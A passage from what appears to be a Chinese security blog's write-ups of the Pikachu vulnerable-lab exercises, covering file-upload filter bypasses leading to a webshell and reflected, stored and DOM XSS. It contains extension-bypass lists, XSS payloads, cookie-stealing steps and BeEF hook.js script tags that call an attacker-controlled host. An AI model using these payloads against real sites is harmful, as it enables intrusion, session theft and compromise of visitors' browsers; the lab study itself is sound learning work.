class="line">jxv</span><br><span class="line">jspf</span><br><span class="line">jtml</span><br><span class="line">JSp</span><br><span class="line">jSpx</span><br><span class="line">jSpa</span><br><span class="line">jSw</span><br><span class="line">jSv</span><br><span class="line">jSpf</span><br><span class="line">jHtml</span><br><span class="line">asp/test.jpg</span><br><span class="line">asp;.jpg</span><br><span class="line">cer/test.jpg</span><br><span class="line">cer;.jpg</span><br><span class="line">asa/test.jpg</span><br><span class="line">asa;.jpg</span><br><span class="line">aSp/test.jpg</span><br><span class="line">aSp;.jpg</span><br><span class="line">cEr/test.jpg</span><br><span class="line">cEr;.jpg</span><br><span class="line">aSa/test.jpg</span><br><span class="line">aSa;.jpg</span><br><span class="line">jpg/xx.php</span><br><span class="line">jpg/xx.pHp</span><br><span class="line">jpg/.php</span><br><span class="line">jpg/.pHp</span><br><span class="line">php.xs.aa</span><br><span class="line">php2.aa</span><br><span class="line">php3.aa</span><br><span class="line">php4.aa</span><br><span class="line">php5.aa</span><br><span class="line">pHp.aa</span><br><span class="line">pHp2.aa</span><br><span class="line">pHp3.aa</span><br><span class="line">pHp4.aaa</span><br><span class="line">pHp5.aa</span><br><span class="line">html.aa</span><br><span class="line">htm.aa</span><br><span class="line">phtml.aa</span><br><span class="line">pht.aaa</span><br><span class="line">Html.aaa</span><br><span class="line">Htm.aa</span><br><span class="line">pHtml.aa</span><br><span class="line">php::$DATA</span><br></pre></td></tr></table></figure>
+
+<h1 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h1><p>可以看一下网站源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $type=array(&#x27;jpg&#x27;,&#x27;jpeg&#x27;,&#x27;png&#x27;);//指定类型</span><br><span class="line">    $mime=array(&#x27;image/jpg&#x27;,&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;);</span><br><span class="line">    $save_path=&#x27;uploads&#x27;.date(&#x27;/Y/m/d/&#x27;);//根据当天日期生成一个文件夹</span><br><span class="line">    $upload=upload(&#x27;uploadfile&#x27;,&#x27;512000&#x27;,$type,$mime,$save_path);//调用函数</span><br><span class="line">    if($upload[&#x27;return&#x27;])&#123;</span><br><span class="line">        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;文件上传成功&lt;/p&gt;&lt;p class=&#x27;notice&#x27;&gt;文件保存的路径为：&#123;$upload[&#x27;save_path&#x27;]&#125;&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $html.=&quot;&lt;p class=notice&gt;&#123;$upload[&#x27;error&#x27;]&#125;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>服务端校验了文件的MIME和后缀，并且用的是白名单</p>
+<p>可以看到还校验了文件内容</p>
+<p><img src="/images/image-20230110112128136.png" alt="image-20230110112128136"></p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>1.文件内容添加</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
+
+<p>这是gif文件的文件头</p>
+<p>其他的请求头可以参考《文件上传内容校验绕过》</p>
+<p>2.更改后缀为png</p>
+<p>3.更改MIME类型为image&#x2F;png</p>
+<p><img src="/images/image-20230110113115973.png" alt="image-20230110113115973"></p>
+<p>成功上传</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uploads/2023/01/10/27979263bcdba99b950336034711.png</span><br></pre></td></tr></table></figure>
+
+<p>由于后缀为png，所以这里需要配合文件包含进行利用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=../../unsafeupload/uploads/2023/01/10/27979263bcdba99b950336034711.png</span><br></pre></td></tr></table></figure>
+
+<p>url为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2023/01/10/27979263bcdba99b950336034711.png&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
+
+<p>成功连接webshell</p>
+<p><img src="/images/image-20230110133348854.png" alt="image-20230110133348854"></p>
+<h1 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h1><p>MIME类型用来告诉服务器，上传的文件内容是什么类型</p>
+<p>MIME校验就是服务器端限制上传文件的MIME，是一种服务端的校验</p>
+<p>MIME是由上传文件的body的Content-Type指定的</p>
+<p><img src="/images/image-20230110111354014.png" alt="image-20230110111354014"></p>
+<h3 id="常见的MIME类型"><a href="#常见的MIME类型" class="headerlink" title="常见的MIME类型"></a>常见的MIME类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">超文本标记语言文本 .html、.html：text/html</span><br><span class="line"></span><br><span class="line"> 普通文本 .txt： text/plain</span><br><span class="line"></span><br><span class="line"> RTF 文本 .rtf： application/rtf</span><br><span class="line"></span><br><span class="line"> GIF 图形 .gif： image/gif</span><br><span class="line"></span><br><span class="line"> JPEG 图形 .jpeg、.jpg： image/jpeg</span><br><span class="line"></span><br><span class="line"> au 声音文件 .au： audio/basic</span><br><span class="line"></span><br><span class="line"> MIDI 音乐文件 mid、.midi： audio/midi、audio/x-midi</span><br><span class="line"></span><br><span class="line"> RealAudio 音乐文件 .ra、.ram： audio/x-pn-realaudio</span><br><span class="line"></span><br><span class="line"> MPEG 文件 .mpg、.mpeg： video/mpeg</span><br><span class="line"></span><br><span class="line"> AVI 文件 .avi： video/x-msvideo</span><br><span class="line"></span><br><span class="line"> GZIP 文件 .gz： application/x-gzip</span><br><span class="line"></span><br><span class="line"> TAR 文件 .tar： application/x-tar</span><br><span class="line"> </span><br><span class="line"> png文件 image/png</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>当上传webshell时</p>
+<p><img src="/images/image-20230110111246587.png" alt="image-20230110111246587"></p>
+<p>此时Content-Type指定的MIME类型为application&#x2F;octet-stream</p>
+<p>将其改为jpg或png的MIME类型</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jpg image/jpeg</span><br><span class="line"></span><br><span class="line">png image/png</span><br></pre></td></tr></table></figure>
+
+<p>成功上传</p>
+<p><img src="/images/image-20230110111611594.png" alt="image-20230110111611594"></p>
+<p>成功连接webshell</p>
+<p><img src="/images/image-20230110111625267.png" alt="image-20230110111625267"></p>
+<h1 id="文件上传内容校验绕过"><a href="#文件上传内容校验绕过" class="headerlink" title="文件上传内容校验绕过"></a>文件上传内容校验绕过</h1><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>这里在使用的时候建议直接去修改hex中的16进制</p>
+<h5 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PNG文件头: 89 50 4E 47 0D 0A 1A 0A </span><br><span class="line"></span><br><span class="line">JPG文件头: FF D8 FF</span><br><span class="line"></span><br><span class="line">GIF (gif)文件头：47494638</span><br></pre></td></tr></table></figure>
+
+<h5 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
+
+<h5 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h5><p>16进制文件头为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FF D8 FF</span><br></pre></td></tr></table></figure>
+
+<h5 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h5><p>16进制文件头为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">89 50 4E 47</span><br></pre></td></tr></table></figure>
+
+<h5 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Zip Compressed</span><br></pre></td></tr></table></figure>
+
+<h5 id="doc-xls-xlt-ppt-apr"><a href="#doc-xls-xlt-ppt-apr" class="headerlink" title="doc;xls;xlt;ppt;apr"></a>doc;xls;xlt;ppt;apr</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MS Compound Document v1 or Lotus Approach APRfile</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>pikachu靶场系列</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>pikachu靶场系列-xss</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/xss/</url>
+    <content><![CDATA[<h1 id="XSS概述"><a href="#XSS概述" class="headerlink" title="XSS概述"></a>XSS概述</h1><p><img src="/./assets/1660183695659-3123c470-f608-4694-b555-23d2741c5e75.png" alt="img"></p>
+<p>具体来说，XSS攻击有两种类型：存储型XSS和反射型XSS，此外还涉及一种DOM型的XSS。</p>
+<h5 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h5><p>指的是将攻击代码存储在网站的数据库中，等待用户访问时自动执行。</p>
+<h5 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h5><p>指的是将攻击代码作为URL参数的值传递给服务器，服务器将其直接输出到浏览器端，从而在用户的浏览器中执行攻击代码。</p>
+<h5 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h5><p>是一种比较特殊的XSS攻击，它利用浏览器中的DOM（文档对象模型）漏洞来实现攻击。与传统的XSS攻击相比，DOM型XSS有一些明显的区别：</p>
+<p>1.DOM型XSS不依赖于服务器的输出，因此无需修改服务器端代码来攻击。</p>
+<p>2.DOM型XSS攻击的源代码不会被服务器端的代码直接输出，而是通过浏览器的JavaScript代码在客户端进行解析和执行。</p>
+<p>3.DOM型XSS攻击的攻击范围更广，可以通过各种手段（如邮件、聊天工具、社交媒体等）将攻击代码传递给用户，从而对用户的浏览器进行攻击。</p>
+<h5 id="辨别"><a href="#辨别" class="headerlink" title="辨别"></a>辨别</h5><p>如何辨别一个XSS攻击是否为DOM型XSS呢？下面是几个可以帮助你进行辨别的方法：</p>
+<p>1.检查攻击代码是否被服务器端的代码直接输出。如果攻击代码被直接输出，则可能是反射型XSS；如果攻击代码未被直接输出，则可能是DOM型XSS。</p>
+<p>2.检查攻击代码是否来自用户的输入。如果攻击代码来自用户的输入，则可能是DOM型XSS；如果攻击代码不是来自用户的输入，则可能是存储型XSS。</p>
+<p>3.检查攻击代码是否依赖于浏览器的JavaScript代码执行。如果攻击代码依赖于浏览器的JavaScript代码执行，则可能是DOM型XSS；如果攻击代码不依赖于浏览器的JavaScript代码执行，则可能是存储型XSS。</p>
+<h5 id="最基本的payload"><a href="#最基本的payload" class="headerlink" title="最基本的payload"></a>最基本的payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>该payload会在浏览器上跳出一个弹窗</p>
+<p>xss就是在我们可控的地方放入可解析的代码</p>
+<p><img src="/images/1660186046326-4d44628a-58c7-457d-90ed-96f14c503504.png" alt="img"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/zfYRi8kCu1KRb17cjXo7Zg">https://mp.weixin.qq.com/s/zfYRi8kCu1KRb17cjXo7Zg</a></p>
+<h1 id="BeEF-XSS利用框架安装"><a href="#BeEF-XSS利用框架安装" class="headerlink" title="BeEF XSS利用框架安装"></a>BeEF XSS利用框架安装</h1><p>攻击机使用的是kali系统(免费，可直接下载)</p>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>apt install beef-xss安装BeeF攻击框架，这里就不详细展开了，安装好后web页面如下图。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install beef-xss</span><br></pre></td></tr></table></figure>
+
+<p>如果提示无法定位软件包，可以先apt-get update后再尝试</p>
+<p>如果还是不行，可手动安装</p>
+<p><a href="https://beefproject.com/">https://beefproject.com/</a></p>
+<p><a href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a></p>
+<p>下载后可能会报毒，不用在意</p>
+<p>放置kali后解压</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./install</span><br></pre></td></tr></table></figure>
+
+<p>如果还不行可能和新旧版本的kali有关系</p>
+<p>可在其他linux系统安装，这里使用的是ubuntu</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./beef</span><br></pre></td></tr></table></figure>
+
+<p>第一次运行需要修改密码</p>
+<p><img src="/images/image-20230108165651096.png" alt="image-20230108165651096"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gedit config.yaml</span><br></pre></td></tr></table></figure>
+
+<p>此处更改为自己的用户名密码</p>
+<p><img src="/images/image-20230108165800888.png" alt="image-20230108165800888"></p>
+<p>然后登录web界面</p>
+<p><img src="/images/image-20230108170143782.png" alt="image-20230108170143782"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.28.150:3000/ui/authentication</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1660272799566-358ac5e0-a1d0-41e1-8baf-fddcd4d5bef0.png"></p>
+<p>登录进入后台，用户名为beef</p>
+<p><img src="/images/1660272885067-9a84d647-c2e3-4e2f-a726-de1e9d91ccea.png" alt="img"></p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>beef启动时命令行会给出web页面地址和攻击payload</p>
+<p>使用脚本安装的可能没有，自己补全即可</p>
+<p><img src="/images/1660273051219-eacadab3-5b6a-41e0-81a0-25102f9c3337.png" alt="img"></p>
+<p>payload换上攻击机的ip地址，直接上</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;http://192.168.28.150:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;http://192.168.28.150:3000/hook.js&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1660273246927-955ad279-5970-48da-aeea-f60169d3aa66.png" alt="img"></p>
+<p>获取访问留言板的电脑的主机信息</p>
+<p><img src="/images/1660273284160-d43efe33-735d-47ed-afd2-0fc84bd2a331.png" alt="img"></p>
+<p>同样，换个虚拟机发起请求</p>
+<p><img src="/images/1660273396042-19900f44-d5a1-43d4-b1e4-ea70fcf991c0.png" alt="img"></p>
+<p>攻击机kali获取到主机信息</p>
+<p><img src="/images/1660273432143-abf8f51a-aa13-4153-ba8c-92b64387d022.png" alt="img"></p>
+<p>同样，如果只是反射型的xss，只要让受害者点击恶意链接，也可造成同样效果</p>
+<p>可以使用反射型xss(get)进行试验，恶意链接如下：</p>
+<p><a href="http://192.168.43.100/DX/pikachu/vul/xss/xss_reflected_get.php?message=%3C/script%3E&submit=submit">http://192.168.43.100/DX/pikachu/vul/xss/xss_reflected_get.php?message&#x3D;%3Cscript+src%3D%22http%3A%2F%2F192.168.28.153%3A3000%2Fhook.js%22%3E%3C%2Fscript%3E&amp;submit&#x3D;submit</a></p>
+<p>攻击机获取到主机信息</p>
+<p><img src="/images/1660274095597-5d0a5c5d-ae55-4c06-9db9-cee2268a2fb8.png" alt="img"></p>
+<h1 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h1><p>是一种非持久化的xss，即攻击行为在网页刷新后就不存在了(但如果是get请求需要将payload删除)，攻击行为只会发生在客户端，即浏览器，并不会将攻击代码存储到网站服务器中。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$input = $_GET[&quot;test&quot;];</span><br><span class="line">echo &quot;&lt;div&gt;&quot;.$input.&quot;&lt;/div&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可控点在<div>标签里面</div></p>
+<p><img src="/images/1662617312740-0ed9d6ef-f86b-42b1-a38f-1e4bacd65d8f.png" alt="img"></p>
+<p>直接插入payload</p>
+<p><img src="/images/1662617482276-c28ec953-08dc-4b2a-b974-786779e9b345.png" alt="img"></p>
+<p>反射型xss就是把用户输入的数据“反射”给浏览器，也就是说，用户在访问恶意链接时，才能攻击成功，反射型xss也叫做非持久性xss。</p>
+<p>反射型xss需要服务端解析响应参与，但输入的payload并不存储在服务器上。</p>
+<h2 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h2><p>可以f12查看可控点</p>
+<p><img src="/images/1660476633506-b93b6ac7-2f8c-476c-957e-b738bcea1750.png" alt="img"></p>
+<p>xss的验证方法基本上就是拿着payload见框就插</p>
+<p>该题首先发现payload压根输不满</p>
+<p><img src="/images/1660184936621-b04dfb7b-3a7b-4f43-8402-b665448d06e4.png" alt="img"></p>
+<p>这里有多种解决方法。</p>
+<p>1.f12直接更改前端代码。</p>
+<p>将maxlenth字段删除</p>
+<p><img src="/images/1660185365090-0dcdec0a-d027-4b2f-959b-fabf9b5d6230.png" alt="img"></p>
+<p><img src="/images/1660185501321-c7b0d245-99a4-4105-b5da-a72d56c0036c.png" alt="img"></p>
+<p>2.抓包后修改放包。</p>
+<p>抓包后直接修改请求。注意有些情况需要url编码。</p>
+<p><img src="/images/1660185676861-9595165b-756c-46cc-afb1-ddf2ead09de2.png" alt="img"></p>
+<p>3.因为是get请求，可以直接在地址栏修改</p>
+<p><img src="/images/1660185993458-1c631800-176a-4506-a867-489816d8e492.png" alt="img"></p>
+<p>成功弹窗</p>
+<p><img src="/images/1660185960775-3d08b7c5-6199-44cf-9065-a0c127699488.png" alt="img"></p>
+<h2 id="反射型xss-post"><a href="#反射型xss-post" class="headerlink" title="反射型xss(post)"></a>反射型xss(post)</h2><p>post请求即发送的payload并不会显示到url地址栏中，而是放在数据包的body部分</p>
+<p><img src="/images/1660186338853-0af903af-6785-46b8-9d4c-5af5fdb84308.png" alt="img"></p>
+<p>根据提示考察的是通过xss获取cookie，先登录。</p>
+<p>首先alert一个弹窗看看是否存在xss</p>
+<p><img src="/images/1660186626342-0cc88d27-f63f-4f2a-9329-c4027d952498.png" alt="img"></p>
+<p>可以看出post类型的反射型xss</p>
+<p><img src="/images/1660186598976-013e91db-3e38-4995-a190-ae926e8eb50c.png" alt="img"></p>
+<p>插入获取cookie的payload</p>
+<script>alert(document.cookie)</script>
+
+<h3 id="关于document-cookie"><a href="#关于document-cookie" class="headerlink" title="关于document.cookie"></a>关于document.cookie</h3><p>cookie是用于维持用户登录状态和行为的一个东东，获取到用户的cookie就相当于获取到了用户的用户名和密码。</p>
+<p>JavaScript 可以使用 document.cookie 属性来创建 、读取、及删除 cookie。</p>
+<p>document.cookie可以读取当前cookie</p>
+<p><img src="/images/1660187377093-761310f5-2c3c-4592-8546-546236b52087.png" alt="img"></p>
+<p>成功获取cookie</p>
+<p><img src="/images/1660186806768-2ad9856c-676a-46a2-b34b-e8f8919fd84a.png" alt="img"></p>
+<h3 id="cookie利用"><a href="#cookie利用" class="headerlink" title="cookie利用"></a>cookie利用</h3><p>这里可以体会一下cookie的作用</p>
+<p>首先抓包保存登录后的后台路径和cookie值</p>
+<p><img src="/images/1660188619423-f9acd23a-bf2f-496e-bcac-e579b485d986.png" alt="img"></p>
+<p>退出登录，重新对后台路径发起请求，并添加cookie</p>
+<p><img src="/images/1660188991267-eb771206-5a58-44f3-99df-fa44d9d722dc.png" alt="img"></p>
+<p>成功登录</p>
+<p><img src="/images/1660189006511-4813c1c4-9010-4789-8da6-56a049bc66ab.png" alt="img"></p>
+<h1 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h1><p>持久型跨站点脚本</p>
+<p>持久型主要体现在其xss攻击代码会保存至服务器网站数据库中，所以当存储型xss发生时，所有访问受攻击页面的用户都会受到影响。</p>
+<p>可以f12查看可控点</p>
+<p><img src="/images/1660476725683-a4db4011-7712-44b5-b103-b66429005e53.png" alt="img"></p>
+<p>往留言板中插入恶意payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1660270330674-45d49425-c4f4-4192-b6be-e8ede2722051.png" alt="img"></p>
+<p>出现弹窗</p>
+<p><img src="/images/1660270354073-bda7e2e1-c31f-4596-a317-c39de9586345.png" alt="img"></p>
+<p>可以发现已经存储到服务器数据库</p>
+<p><img src="/images/1660270377285-9b1c3bac-230c-451b-b8bc-165e8fc53a37.png" alt="img"></p>
+<p>此时更换一个浏览器再次访问该留言板地址</p>
+<p>依然会出现弹窗</p>
+<p><img src="/images/1660270428509-83838f57-b9c4-456f-8037-5c5b003c1397.png" alt="img"></p>
+<p>存储型xss的危害比反射型xss危害大得多，当服务器被植入存储型xss时，可被用来钓鱼，窃取cookie，用户登录凭证等。</p>
+<h2 id="存储型xss利用"><a href="#存储型xss利用" class="headerlink" title="存储型xss利用"></a>存储型xss利用</h2><p>这里可以直观的体现一下存储型xss的作用</p>
+<p>攻击机使用的是kali系统(免费，可直接下载)</p>
+<p>apt install beef-xss安装BeeF攻击框架，这里就不详细展开了，安装好后web页面如下图。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install beef-xss</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1660272799566-358ac5e0-a1d0-41e1-8baf-fddcd4d5bef0.png" alt="img"></p>
+<p>登录进入后台，用户名为beef</p>
+<p><img src="/images/1660272885067-9a84d647-c2e3-4e2f-a726-de1e9d91ccea.png" alt="img"></p>
+<p>启动时命令行会给出web页面地址和攻击payload</p>
+<p><img src="/images/1660273051219-eacadab3-5b6a-41e0-81a0-25102f9c3337.png" alt="img"></p>
+<p>payload换上攻击机的ip地址，直接上</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;http://192.168.28.153:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1660273246927-955ad279-5970-48da-aeea-f60169d3aa66.png" alt="img"></p>
+<p>获取访问留言板的电脑的主机信息</p>
+<p><img src="/images/1660273284160-d43efe33-735d-47ed-afd2-0fc84bd2a331.png" alt="img"></p>
+<p>同样，换个虚拟机发起请求</p>
+<p><img src="/images/1660273396042-19900f44-d5a1-43d4-b1e4-ea70fcf991c0.png" alt="img"></p>
+<p>攻击机kali获取到主机信息</p>
+<p><img src="/images/1660273432143-abf8f51a-aa13-4153-ba8c-92b64387d022.png" alt="img"></p>
+<p>同样，如果只是反射型的xss，只要让受害者点击恶意链接，也可造成同样效果</p>
+<p>可以使用反射型xss(get)进行试验，恶意链接如下：</p>
+<p><a href="http://192.168.43.100/DX/pikachu/vul/xss/xss_reflected_get.php?message=%3C/script%3E&submit=submit">http://192.168.43.100/DX/pikachu/vul/xss/xss_reflected_get.php?message&#x3D;%3Cscript+src%3D%22http%3A%2F%2F192.168.28.153%3A3000%2Fhook.js%22%3E%3C%2Fscript%3E&amp;submit&#x3D;submit</a></p>
+<p>攻击机获取到主机信息</p>
+<p><img src="/images/1660274095597-5d0a5c5d-ae55-4c06-9db9-cee2268a2fb8.png" alt="img"></p>
+<h1 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h1><h2 id="DOM概述"><a href="#DOM概述" class="headerlink" title="DOM概述"></a>DOM概述</h2><p>简单来说，DOM文档就是一份XML文档，当有了DOM标准之后，DOM便将前端html代码化为一个树状结构，方便程序和脚本能够轻松的动态访问和更新这个树状结构的内容、结构以及样式，且不需要经过服务端，所以DOM型xss在js前端自己就可以完成数据的输入输出，不与服务器产生交互，这样来说DOM型xss也可以理解为反射性xss。</p>
+<p>DOM XSS与反射性XSS、存储型XSS的主要区别在于DOM XSS的XSS代码不需要服务端解析响应的直接参与，触发XSS的是浏览器端的DOM解析。一般不与服务器交互，所以输入的payload也不会存储在服务器上。</p>
+<p>但其实质是通过修改页面的DOM节点形成的xss，所以在后面的xss-x中，可以发现与服务器产生了交互，但是由于还是通过修改页面的DOM节点形成的xss，所以也归为dom型xss。</p>
+<p>有关DOM的可以参考<a href="https://www.runoob.com/htmldom/htmldom-tutorial.html">https://www.runoob.com/htmldom/htmldom-tutorial.html</a></p>
+<h3 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function test()&#123;</span><br><span class="line">	var str = document.getElementById(&quot;test&quot;).value;</span><br><span class="line">	document.getElementById(&quot;t&quot;).innerHTML = &quot;&lt;a href=&#x27;&quot;+str+&quot;&#x27; &gt;testLink&lt;/a&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;t&quot; &gt;&lt;/div&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; id=&quot;test&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; id=&quot;s&quot; value=&quot;write&quot; onclick=&quot;test()&quot; /&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码，就是将输入到id&#x3D;test的文本框的文本内容，点击write按钮后，执行test()函数，将输入的文本内容，放到a标签的href中显示到前端（<a href="xxxxxxxxxx">testLink</a>）</p>
+<p><img src="/images/1662618457481-02526d36-c474-4b34-930a-88bcc7e994ad.png" alt="img"></p>
+<p>随便输入一个hello world，点击write</p>
+<p>可以发现源代码中出现一个a标签，href中就是我们输入的内容</p>
+<p><img src="/images/1662618556441-26f7763e-33a1-44be-b399-e354008e787d.png" alt="img"></p>
+<p>而且可以抓包，当我们点击write时，并不会抓到数据包，仅在前端html中输出</p>
+<h3 id="插入payload"><a href="#插入payload" class="headerlink" title="插入payload"></a>插入payload</h3><p>由于可控点在a标签中的href属性，需要先将a标签闭合或使用事件触发</p>
+<h5 id="事件触发"><a href="#事件触发" class="headerlink" title="事件触发"></a>事件触发</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; onclick=alert(/xss/) //</span><br></pre></td></tr></table></figure>
+
+<p>首先用一个单引号闭合掉href的第一个单引号，然后插入一个onclick事件，最后用注释符“&#x2F;&#x2F;”注释掉单引号。点击新生连接，脚本将被执行。</p>
+<p><img src="/images/1662619049036-41394025-6721-467d-9b09-b15fde9a206b.png" alt="img"></p>
+<h5 id="闭合a标签"><a href="#闭合a标签" class="headerlink" title="闭合a标签"></a>闭合a标签</h5><p>但使用<script></script>时并不会弹窗</p>
+<p>a标签里并不解析<script>标签</p>
+<p><img src="/images/1662621427146-b9300938-f2ee-4a3e-a152-fe2c26a4756e.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&gt;&lt;img src=# onerror=alert(/xss1/) /&gt;&lt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1662621081022-4933e3f5-efac-4491-900c-af86413897e9.png" alt="img"></p>
+<h3 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h3><p>这段代码实现了一个简单的页面，允许用户输入昵称并在页面上显示</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;DOM XSS Attack Demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Welcome!&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;Please enter your nickname:&lt;/p&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;input id=&quot;nickname&quot; type=&quot;text&quot; /&gt;</span><br><span class="line">        &lt;button type=&quot;submit&quot;&gt;Submit&lt;/button&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;p&gt;Your nickname is: &lt;span id=&quot;display&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        const form = document.querySelector(&#x27;form&#x27;);</span><br><span class="line">        const nicknameInput = document.querySelector(&#x27;#nickname&#x27;);</span><br><span class="line">        const display = document.querySelector(&#x27;#display&#x27;);</span><br><span class="line"></span><br><span class="line">        form.addEventListener(&#x27;submit&#x27;, (event) =&gt; &#123;</span><br><span class="line">            event.preventDefault();</span><br><span class="line"></span><br><span class="line">            const nickname = nicknameInput.value;</span><br><span class="line">            display.innerHTML = nickname;</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>随便输入一串字符</p>
+<p><img src="/images/image-20230107224210191.png" alt="image-20230107224210191"></p>
+<p>抓包也没有与服务器交互</p>
+<p>直接通过前端的js代码将输入框的东西输出到浏览器</p>
